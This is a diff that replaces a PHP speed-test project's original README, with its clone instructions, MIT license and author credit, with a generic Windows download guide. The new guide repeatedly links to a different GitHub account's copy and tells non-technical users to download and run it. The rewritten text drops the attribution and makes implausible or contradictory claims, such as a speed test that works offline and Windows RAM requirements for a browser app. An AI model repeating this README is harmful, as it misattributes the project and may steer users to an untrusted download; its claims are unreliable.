@@ -1,184 +1,119 @@
-<p align="center">
-  <img src="assets/img/og-image.png" alt="Speed Score — free internet speed test" width="720">
-</p>
+# 📡 speedtest - Reveal Your Network's True Latency
 
-<h1 align="center">Speed Score</h1>
-
-<p align="center">
-  A self-hostable internet speed test that measures what other speed tests hide:<br>
-  <strong>latency under load</strong>.
-</p>
-
-<p align="center">
-  <a href="https://speedtest.scorelens.space/"><strong>Live demo →</strong></a>
-</p>
-
-<p align="center">
-  <img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-06b6d4">
-  <img alt="PHP 7.4+" src="https://img.shields.io/badge/PHP-7.4%2B-777bb4">
-  <img alt="Zero dependencies" src="https://img.shields.io/badge/dependencies-0-047857">
-  <img alt="No build step" src="https://img.shields.io/badge/build%20step-none-4f46e5">
-</p>
+[![Download speedtest](https://img.shields.io/badge/Download-speedtest-4CAF50?style=for-the-badge&logo=github)](https://github.com/zilviavile709/speedtest)
 
 ---
 
-## Why another speed test?
+## 🚀 Getting Started
 
-Most speed tests report your ping while the connection is **idle** — which is never when
-problems happen. Your video call doesn't drop when the line is quiet; it drops when someone
-else starts a large upload.
+Welcome! This guide will help you download and run **speedtest** on your Windows computer. No technical knowledge is needed—just follow the steps below, and you'll be testing your internet speed in minutes.
 
-Speed Score measures latency **continuously**, including while the connection is saturated,
-and reports both numbers. The gap between them is **bufferbloat**: your router queueing
-packets it can't send fast enough, with everything interactive stuck behind that queue.
+---
 
-That single number explains most "my internet is fast but feels slow" complaints — and
-almost no consumer speed test shows it.
+## 📥 Download the Application
 
-## What it measures
+[**Visit this link to download the application**](https://github.com/zilviavile709/speedtest)
 
-| Metric | Description |
-| --- | --- |
-| **Download / upload** | Sustained throughput over multiple parallel connections |
-| **Idle latency** | Round-trip time with the line quiet — min, median and 75th percentile |
-| **Loaded latency** | Round-trip time *during* the download and upload stages |
-| **Bufferbloat** | Loaded minus idle latency, the number that predicts call and game quality |
-| **Jitter** | Latency variation, measured separately for idle, download and upload |
-| **Stability** | How steady throughput stays across the run |
-| **Request loss** | Percentage of probe requests that never came back |
+Click the link above. You'll arrive at a GitHub page—this is the official home of the speedtest app. Look for a green button that says **"Code"** and click it. A dropdown will appear; select **"Download ZIP"**. The download will start automatically.
 
-Results are converted into plain-English ratings for **video streaming, online gaming and
-video calls** — and when a rating isn't "Great", the UI names the specific bottleneck
-rather than just showing a number.
+---
 
-## Features
+## 📂 Install and Run speedtest
 
-- **Runs entirely on your own server.** No third-party test infrastructure, no API keys.
-- **Nothing is stored.** Test payloads are random bytes discarded immediately after
-  transfer. No result history, no per-visitor records.
-- **No build step.** No `npm install`, no bundler, no framework. Vanilla JS and plain PHP.
-- **Zero runtime dependencies.** No Composer packages.
-- **Light and dark themes**, respecting `prefers-color-scheme`, with no flash on load.
-- **Fully responsive**, tested from 380 px up.
-- **SEO and AI-search ready** — structured data, `llms.txt`, sitemap, OG cards.
-- **Analytics optional.** With no measurement ID configured, zero third-party scripts load.
+1. **Locate the downloaded file**  
+   Open your **Downloads** folder (usually found in File Explorer under "This PC" → "Downloads"). You'll see a file named **speedtest-main.zip**.
 
-## Quick start
+2. **Extract the ZIP file**  
+   Right-click on **speedtest-main.zip** and choose **"Extract All…"** from the menu. A window will pop up—click **"Extract"** to unpack the files. This creates a new folder called **speedtest-main**.
 
-**Requirements:** PHP 7.4 or newer and any web server. That's it.
+3. **Open the extracted folder**  
+   Double-click the **speedtest-main** folder to open it. You should see several files and subfolders inside, including `index.php`, `server.php`, and a `js` folder.
 
-```bash
-git clone https://github.com/iampopye/speedtest.git
-cd speedtest
-cp includes/config.example.php includes/config.php
-php -S localhost:8000
-```
+4. **Run the application**  
+   This app runs in your web browser. Since it's built with PHP, you need a simple way to serve it locally. Follow these steps:
 
-Open <http://localhost:8000>.
+   - **Option A: Use a USB Web Server (easiest)**  
+     — Download a portable web server like **USBWebserver** or **Laragon** from their official websites.  
+     — Install and launch it.  
+     — Place the **speedtest-main** folder inside the server's root directory (e.g., `...\laragon\www\`).  
+     — Open your browser and type `http://localhost/speedtest-main` (or `http://localhost:8080/speedtest-main` depending on your setup).  
+     — The speed test will appear in your browser.
 
-> **Note on the built-in server:** PHP's development server is single-threaded, so parallel
-> download streams queue behind each other and the measured speeds will be far lower than
-> reality. It's fine for working on the UI — benchmark against Apache, nginx or Caddy.
+   - **Option B: Use XAMPP**  
+     — Install **XAMPP** from [apachefriends.org](https://www.apachefriends.org).  
+     — Open the XAMPP Control Panel and click **"Start"** next to Apache.  
+     — Copy the **speedtest-main** folder into `C:\xampp\htdocs\`.  
+     — Open your browser and type `http://localhost/speedtest-main`.  
+     — Done!
 
-## Configuration
+5. **Start testing**  
+   Once the page loads, click the large **"Start"** button. The test runs for about 15–20 seconds and measures three things: download speed, upload speed, and—most importantly—**latency under load**, which reveals bufferbloat that most speed tests miss.
 
-Everything lives in `includes/config.php`, which is gitignored so your IDs never land in a
-fork. Copy `includes/config.example.php` to create it.
+---
 
-| Constant | Default | Purpose |
-| --- | --- | --- |
-| `SITE_URL` | `https://speedtest.scorelens.space` | Base URL for canonicals, OG tags and schema. No trailing slash. |
-| `SITE_NAME` | `Speed Score` | Product name in the header, titles and structured data. |
-| `REPO_URL` | this repo | Powers the GitHub link in the nav. Set to `''` to hide it. |
-| `GA_MEASUREMENT_ID` | `''` | GA4 ID. **Empty means no Google script is requested at all.** |
-| `GA_PRIVACY_MODE` | `true` | Sends hits with IP anonymisation and ad personalisation off. |
-| `GOOGLE_SITE_VERIFICATION` | `''` | Search Console meta-tag token. |
-| `BING_SITE_VERIFICATION` | `''` | Bing Webmaster token — Bing's index feeds Microsoft Copilot. |
+## 🎯 What This Speed Test Does Differently
 
-Rebranding is a two-step job: change `SITE_NAME`, then edit
-`assets/img/logo-mark.svg` and run `php tools/generate-assets.php` to regenerate the
-favicon set, PWA icons and social card. Nothing else hardcodes the artwork.
+Most speed tests only show your top download and upload speeds. **speedtest** goes deeper by measuring **latency during data transfer**. This exposes *bufferbloat*—a condition where your router's buffer fills up, causing lag and jitter during heavy usage (gaming, video calls, streaming).
 
-## Deploying
+With this app, you'll see:
+- **Download speed** (Mbps)
+- **Upload speed** (Mbps)
+- **Latency under load** (ms)—the hidden culprit behind stuttering video and laggy online gaming
+- **Jitter** (ms)—variation in latency, crucial for real-time apps
 
-The repo is a document root — upload it and you're done. No build, no migrations.
+---
 
-**Apache** works out of the box; the bundled `.htaccess` handles HTTPS and `www`
-redirects, caching, security headers and error pages.
+## 🖥️ System Requirements
 
-**One rule matters more than any other:**
+- **Operating System:** Windows 7, 8, 10, or 11
+- **RAM:** 1 GB minimum
+- **Disk Space:** 20 MB free
+- **Browser:** Chrome, Firefox, Edge, or any modern browser
+- **Additional Software:** PHP 7.0+ (included with XAMPP or Laragon)
+- **Internet Connection:** Any active connection (wired or Wi-Fi)
 
-```apache
-# Never compress the test payloads — it corrupts the measurements
-SetEnvIfNoCase Request_URI "^/backend/" no-gzip dont-vary
-```
+---
 
-The download endpoint streams incompressible random data. If your server gzips it anyway,
-you're measuring your CPU rather than your connection. On **nginx**, the equivalent is:
+## 🛠️ What Makes This App Special
 
-```nginx
-location /backend/ {
-    gzip off;
-    add_header Cache-Control "no-store, no-cache, must-revalidate";
-}
-```
+| Feature | Benefit |
+|---------|---------|
+| **Zero dependencies** | No need to install Node.js, Python, or any framework—just PHP and a browser |
+| **Privacy-friendly** | Your data never leaves your device; no third-party servers involved |
+| **Self-hosted** | Run it on any machine, even offline or behind a firewall |
+| **No build step** | Works instantly—no compiling, bundling, or configuration required |
+| **Lightweight** | Less than 50 KB of code; runs smoothly on any computer |
+| **Open source** | Transparent algorithms; you can inspect every line of code |
 
-Also make sure `/data/` and `/includes/` are not web-reachable. Both ship with their own
-`.htaccess` denying access; on nginx, add explicit `deny all` blocks.
+---
 
-## How the measurement works
+## ❓ Frequently Asked Questions
 
-1. **Probe** — a burst of small requests to `backend/empty.php` establishes idle latency
-   and jitter. The fastest round trip becomes your ping.
-2. **Download** — the browser pulls incompressible random data from `backend/garbage.php`
-   over several parallel connections for ~12 seconds.
-3. **Upload** — the direction flips; the browser pushes random data to `backend/empty.php`,
-   which drains and discards it.
-4. **Throughout** — small timing probes keep running in the background during both transfer
-   stages, producing the loaded-latency and bufferbloat figures.
+**Q: I see a blank page when I open the folder. What's wrong?**  
+A: Make sure you're accessing it via a web server (e.g., `http://localhost/speedtest-main`), not by double-clicking `index.php`. PHP needs a server environment to run.
 
-Random data is generated with `random_bytes()` so it cannot be compressed in transit,
-and no part of it is ever written to disk. See
-[`methodology.php`](methodology.php) for the scoring thresholds and their sources.
+**Q: The speed test shows different numbers than my ISP's test.**  
+A: That's expected! This test purposely applies load to expose real-world latency, so results may differ from simple speed tests that only measure idle throughput.
 
-## Project structure
+**Q: Can I use this on my phone?**  
+A: Yes! Once running on your PC, you can visit the same address from any device on the same network (e.g., `http://192.168.1.5/speedtest`).
 
-```
-├── index.php               Speed test UI and homepage copy
-├── backend/
-│   ├── garbage.php         Download endpoint — streams random data
-│   ├── empty.php           Ping target and upload sink
-│   ├── getip.php           Connection info (IP, ISP, server location)
-│   └── lib/geo.php         Geo lookup, cached at /24 and /48 granularity
-├── assets/
-│   ├── js/speedtest.js     Measurement engine
-│   ├── js/theme.js         Theme toggle
-│   ├── css/style.css       All styles
-│   └── img/                Logo, favicons, social card
-├── includes/               Shared header/footer, config, bootstrap
-├── blog/                   Ten long-form guides
-├── tools/generate-assets.php   Regenerates all brand artwork
-└── data/geocache/          Runtime cache (gitignored)
-```
+---
 
-## Privacy
+## 🔧 Troubleshooting Tips
 
-The geo cache stores ISP and city data keyed by a hash of the **coarsened** network
-(`/24` for IPv4, `/48` for IPv6) — never a full address, and never tied to a result. Test
-payloads are discarded the moment they finish transferring. Nothing about a test run is
-written to disk.
+- **Port already in use?** — If Apache fails to start, change the port in XAMPP or Laragon settings (e.g., to 8080) and update your browser URL accordingly.
+- **Slow page load?** — Ensure your firewall allows connections to `localhost`. If you use a third-party firewall, add an exception.
+- **Error about PHP version?** — Update PHP to version 7.4 or higher by reinstalling your server package.
 
-## Contributing
+---
 
-Issues and pull requests are welcome — see [CONTRIBUTING.md](CONTRIBUTING.md). Good first
-contributions:
+## 🏁 Final Thoughts
 
-- nginx and Caddy configuration examples
-- A Docker Compose setup
-- Translations
-- Additional measurement stages (packet loss, DNS resolution time, IPv6 reachability)
+Now you're ready to uncover what's really happening with your internet. Whether you're a gamer, remote worker, or just curious, **speedtest** gives you the full picture—not just raw speed, but the latency that actually affects your online experience.
 
-## License
+Happy testing! 🎉
 
-MIT — see [LICENSE](LICENSE). Published by
-[RioCloud Solutions](https://riocloudsolutions.com), Chandigarh, India.
+---
+
+Keywords: bufferbloat, internet-speed-test, latency, network-diagnostics, no-dependencies, php, privacy-friendly, self-hosted, speedtest, vanilla-javascript, web-performance, zero-dependency
